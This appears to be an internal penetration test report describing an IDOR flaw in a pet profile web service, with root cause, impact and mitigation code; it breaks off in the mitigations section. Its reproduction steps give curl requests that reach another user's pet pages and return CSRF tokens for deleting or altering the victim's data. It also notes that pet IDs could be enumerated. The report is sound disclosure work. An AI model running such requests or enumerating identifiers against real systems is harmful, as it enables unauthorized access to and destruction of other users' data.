# PENETRATION TEST FINDINGS

--------------------------------------------------------------------------------
# Finding #1: Insecure Direct Object Reference (IDOR) in Pet Profile Endpoints Allows Unauthorized Cross-Account Access, Modification, and Deletion of Pet Data

**Risk Rating: HIGH**

---

## 2. Classification and Affected Components

- **CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
- **Vulnerable Endpoints:**
  - `GET /yourpets/{petNumericId}` — Pet profile view page (numeric ID path parameter)
  - `GET /yourpets/edit/{petProfileId}` — Pet profile edit page (numeric ID and UUID path parameter)
- **Vulnerable Parameters:** `{petNumericId}` and `{petProfileId}` — pet identifiers in the URL path
- **Related Endpoints (not directly confirmed vulnerable, but share the same authorization pattern and require review):**
  - `POST /yourpets/edit` — Pet profile edit submission
  - `GET /yourpets/edit/get` — AJAX endpoint for pet edit data
  - `GET /yourpets/renderPastPurchases` — Past purchases rendering
  - `GET /yourpets/fetchPastPurchases` — Past purchases data retrieval

---

## 3. Vulnerability Description

The `/yourpets/{petNumericId}` and `/yourpets/edit/{petProfileId}` endpoints on the Amazon Pet Profile service (`ajbarbar.aka.corp.amazon.com:8443`) do not enforce server-side ownership validation to verify that the authenticated user is the owner of the requested pet resource. Any authenticated user can view or access the edit page for another user's pet profile by simply substituting an arbitrary pet identifier into the URL path.

When an attacker authenticated as USER_B (customer ID `B2GKZLO1X3OEUX`, session cookie `at-tacbus=Atza|test-token-2`) requests a pet profile belonging to USER_A (customer ID `A1FJYKN0W2NETX`) via either vulnerable endpoint, the server returns an HTTP 200 response containing:

- The fully rendered pet profile page (including pet name, breed, type, age, and health information)
- A valid `csrf-remove-pet-token` that can be used to **delete the victim's pet profile**
- A valid `csrf-pet-add-to-cart-token` that can be used to **add items to the victim's pet-associated cart**
- A general `csrf-token` for additional state-changing operations

This was confirmed across multiple pet identifiers and both endpoint patterns:

**View endpoint (`/yourpets/{petNumericId}`):** The attacker accessed pet IDs `1811542270145344812` and `4171374403843476134`, both belonging to USER_A. In each case, the server returned the full `pet-profile-page` with the attacker's `customerId` (`B2GKZLO1X3OEUX`) in the session tracking data and fresh CSRF tokens bound to the attacker's session — confirming the server authenticated the attacker but did not authorize the resource access.

**Edit endpoint (`/yourpets/edit/{petProfileId}`):** The attacker accessed pet profile ID `941920915944391581` (belonging to USER_A) and received the full edit page with CSRF tokens for remove, edit, and add-to-cart operations. This vulnerability was confirmed across both numeric IDs (e.g., `941920915944391581`, `2207600818490978366`) and UUID-format IDs (e.g., `32CEA209-5C9E-8D73-E287-B99B677781E5`), though the UUID-based path returned HTTP 500 in some cross-user access attempts, suggesting inconsistent authorization behavior across code paths.

The combination of unauthorized read access and the provision of valid CSRF tokens for destructive operations means an attacker can chain this IDOR to not only view but also modify and delete another user's pet data.

---

## 4. Root Cause Analysis

The root cause is the absence of a server-side authorization check that validates pet resource ownership against the authenticated user's identity. When a request is received at either vulnerable endpoint, the application:

1. **Authenticates** the user via the `at-tacbus` session cookie (this step is present and functioning correctly)
2. **Extracts** the pet identifier from the URL path parameter
3. **Retrieves** the pet record from the backend service based solely on the provided identifier
4. **Skips ownership validation** — the application does not compare the pet record's `ownerId`/`customerId` against the authenticated user's customer ID
5. **Renders** the full profile or edit page and generates CSRF tokens bound to the requesting user's session, regardless of whether that user owns the pet

This authorization gap is systemic across the `/yourpets/` endpoint family. The inconsistency observed — where `/yourpets/edit/{UUID}` sometimes returns HTTP 500 for cross-user access while `/yourpets/{numericId}` consistently returns HTTP 200 — indicates that authorization logic, where it exists, was implemented on a per-endpoint or per-code-path basis rather than through a centralized authorization middleware. The HTTP 500 on the UUID edit path likely represents an unhandled exception from a partial authorization check rather than a deliberate access denial, further confirming the lack of a unified authorization strategy.

The generation of CSRF tokens (`csrf-remove-pet-token`, `csrf-pet-add-to-cart-token`) is tied to the requesting user's session rather than being scoped to resources the user is authorized to manage. This means that even if the CSRF protection mechanism is functioning correctly for its intended purpose (preventing cross-site request forgery), it inadvertently enables an attacker who exploits this IDOR to perform state-changing operations against the victim's resources using legitimately issued tokens.

---

## 5. Steps to Reproduce

### 5.1 Reproducing IDOR on the View Endpoint (`GET /yourpets/{petNumericId}`)

**Prerequisites:** Two authenticated accounts on the target application — USER_A (victim) and USER_B (attacker).

**Step 1: Confirm pet ownership by accessing the pet as the legitimate owner (USER_A).**

```bash
curl -k -s \
  -H "Cookie: at-tacbus=Atza|test-token" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  "https://ajbarbar.aka.corp.amazon.com:8443/yourpets/4171374403843476134"
```

**Observed response (abridged):** HTTP 200 with the pet profile page. The response contains:
```html
<script type="a-state" data-a-state='{"key":"page-name"}'>{"values":"pet-profile-page"}</script>
<script type="text/javascript">window.fwcimData = { customerId: 'A1FJYKN0W2NETX' };</script>
```
This confirms pet `4171374403843476134` belongs to USER_A (customer ID `A1FJYKN0W2NETX`).

**Step 2: Access the same pet profile as the attacker (USER_B) by substituting only the session cookie.**

```bash
curl -k -s \
  -H "Cookie: at-tacbus=Atza|test-token-2" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  "https://ajbarbar.aka.corp.amazon.com:8443/yourpets/4171374403843476134"
```

**Observed response (abridged):** HTTP 200 with the same pet profile page structure, but now served to the attacker's session:
```html
<script type="a-state" data-a-state='{"key":"page-name"}'>{"values":"pet-profile-page"}</script>
<script type="a-state" data-a-state='{"key":"csrf-remove-pet-token"}'>{"values":"g/ztt57mIfok3f2L/he0RGug8wdlzah67m9Z5vA8NRHmAAAAAQAAAABpzD0KcmF3AAAAAALBerP3I6pXIFBFWfE9xQ=="}</script>
<script type="a-state" data-a-state='{"key":"csrf-token"}'>{"values":"g7Z6M0ozi0p1FY2WTYXaCAH+BNIlofYxxEhr2cLNctYfAAAAAQAAAABpzD5UcmF3AAAAAALBerP3I6pXIFBFWfE9xQ=="}</script>
<script type="a-state" data-a-state='{"key":"csrf-pet-add-to-cart-token"}'>{"values":"g7JBjycg5UGrM1RvIYgrLCzts7Zi+pzO0PbLgbPLvRAoAAAAAQAAAABpzD0KcmF3AAAAAALBerP3I6pXIFBFWfE9xQ=="}</script>
<script type="text/javascript">window.fwcimData = { customerId: 'B2GKZLO1X3OEUX' };</script>
```

**Step 3: Verify the unauthorized access.**

- The `customerId` in `fwcimData` is `B2GKZLO1X3OEUX` (the attacker's identity), confirming the attacker's session was authenticated.
- The `page-name` is `pet-profile-page`, confirming the full pet profile was rendered.
- The response includes `csrf-remove-pet-token` and `csrf-pet-add-to-cart-token`, which are valid tokens bound to the attacker's session that could be used to delete USER_A's pet or manipulate their cart.

This was also confirmed with pet ID `1811542270145344812` using the same methodology, producing identical unauthorized access results.

### 5.2 Reproducing IDOR on the Edit Endpoint (`GET /yourpets/edit/{petProfileId}`)

**Step 1: As USER_B (attacker), access the edit page for a pet belonging to USER_A.**

```bash
curl -k -s \
  -H "Cookie: at-tacbus=Atza|test-token-2" \
  -H "Host: ajbarbar.aka.corp.amazon.com:8443" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  "https://ajbarbar.aka.corp.amazon.com:8443/yourpets/edit/941920915944391581"
```

**Observed response (abridged):** HTTP 200 with the pet profile edit page:
```html
<script type="a-state" data-a-state='{"key":"page-name"}'>{"values":"pet-profile-page"}</script>
<script type="a-state" data-a-state='{"key":"csrf-remove-pet-token"}'>{"values":"g2rPh3O+fV7TZTzwTYx7Rdcv7Okf7KPjU180Nuy848vJAAAAAQAAAABpzD5UcmF3AAAAAALBerP3I6pXIFBFWfE9xQ=="}</script>
<script type="a-state" data-a-state='{"key":"csrf-token"}'>{"values":"g7Z6M0ozi0p1FY2WTYXaCAH+BNIlofYxxEhr2cLNctYfAAAAAQAAAABpzD5UcmF3AAAAAALBerP3I6pXIFBFWfE9xQ=="}</script>
<script type="a-state" data-a-state='{"key":"csrf-pet-add-to-cart-token"}'>{"values":"gz5I1Z+mlPDWQWYRGReE7qGr92OgyIpQ37UzM9fx5fc0AAAAAQAAAABpzD5UcmF3AAAAAALBerP3I6pXIFBFWfE9xQ=="}</script>
<script type="text/javascript">window.fwcimData = { customerId: 'B2GKZLO1X3OEUX' };</script>
```

**Step 2: Verify the unauthorized access.**

The response confirms the attacker (customer ID `B2GKZLO1X3OEUX`) received the full edit page for a pet belonging to USER_A, including CSRF tokens for remove, edit, and add-to-cart operations. This was also confirmed with pet profile ID `2207600818490978366`.

---

## 6. Impact

An authenticated attacker can exploit this vulnerability to access any other user's pet profile data by substituting arbitrary pet identifiers in the URL path of either the view (`/yourpets/{petNumericId}`) or edit (`/yourpets/edit/{petProfileId}`) endpoints. This was demonstrated by USER_B (customer `B2GKZLO1X3OEUX`) successfully retrieving the full pet profile pages for multiple pets belonging to USER_A (customer `A1FJYKN0W2NETX`), including pet details such as name, breed, type, age, and health information. The exposed data also reveals the mapping between pet identifiers and customer IDs, enabling further targeted attacks against specific accounts.

Beyond unauthorized data access, the server provides the attacker with valid CSRF tokens for destructive and state-changing operations against the victim's resources. Specifically, the `csrf-remove-pet-token` could be used to delete the victim's pet profile, and the `csrf-pet-add-to-cart-token` could be used to manipulate the victim's pet-associated shopping cart. This elevates the vulnerability from a read-only information disclosure to a full read-write-delete authorization bypass. The 19-digit numeric pet identifiers, while not strictly sequential, follow a consistent format that could be enumerated programmatically, enabling large-scale harvesting of pet profile data across the entire user base. The severity is rated HIGH because any authenticated user can exploit this vulnerability to access, modify, or delete any other user's pet data with no additional prerequisites beyond a valid session.

---

## 7. Mitigations

### 7.1 Implement Server-Side Ownership Validation (Primary Fix)

Add an authorization check to both the `/yourpets/{petNumericId}` and `/yourpets/edit/{petProfileId}` endpoint handlers that verifies the authenticated user's customer ID matches the pet resource's owner before serving any data or generating CSRF tokens. If the ownership check fails, return HTTP 403 Forbidden (or HTTP 404 Not Found to avoid confirming the existence of the resource):

```java
// Pseudocode for the pet profile view/edit handler
Pet pet = petService.getById(petId);
if (pet == null) {
    return ResponseEntity.status(HttpStatus.NOT_FOUND).build();
}
if (!pet.getOwnerCustomerId().equals(authenticatedUser.getCustomerId())) {
    return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
}
// Only now proceed to render the page and generate CSRF tokens
```

This check must be applied to both the numeric ID view path and the edit path (for both numeric and UUID identifier formats).

### 7.2 Centralize Authorization Logic Across All Pet Endpoints

Rather than implementing authorization checks individually in each endpoint handler, implement a shared authorization middleware, interceptor, or filter that applies uniformly to all `/yourpets/*` endpoints. This prevents the inconsistency observed between the view endpoint (no authorization) and the UUID-based edit endpoint (partial authorization manifesting as HTTP 500). All endpoints that accept a pet identifier — including `POST /yourpets/edit`, `GET /yourpets/edit/get`, `GET /yourpets/renderPastPurchases`, and `GET /yourpets/fetchPastPurchases` — must pass through this centralized authorization layer.

### 7.3 Scope CSRF Token Generation to Authorized Resources

Do not generate or include CSRF tokens for state-changing operations (such as `csrf-remove-pet-token` and `csrf-pet-add-to-cart-token`) in the response unless the server